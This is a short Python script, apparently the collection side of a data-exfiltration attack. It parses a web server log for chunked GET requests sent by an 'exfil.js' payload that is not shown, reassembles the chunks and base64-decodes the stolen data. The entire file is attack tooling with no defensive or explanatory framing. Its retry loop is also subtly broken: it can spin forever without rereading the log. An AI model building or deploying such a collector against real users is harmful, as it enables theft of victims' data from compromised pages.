#!/usr/bin/env python3

import re
import collections
import base64
from time import sleep

def read_log():
    while True:
        with open('./exfil.log', 'r') as f:
            response = f.readlines()
        return response

def read_exfil():
    response = read_log()
    chunks = dict()
    for resp in response:
        if "GET /" in resp and "exfil.js" not in resp:
            index = int(re.findall('index=(\d*)&chunk', resp)[0])
            chunk = re.findall('chunk=(.*)\sHTTP', resp)[0]
            chunks[index] = chunk

    chunks = collections.OrderedDict(sorted(chunks.items(), key=lambda t: t[0]))
    while True:
        try:
            exfil_data = base64.b64decode(''.join(chunks.values())).decode()
            break
        except:
            sleep(1)
            continue
    return exfil_data

def main():
    read_log()
    exfil = read_exfil()
    print(exfil)

if __name__=="__main__":
    main()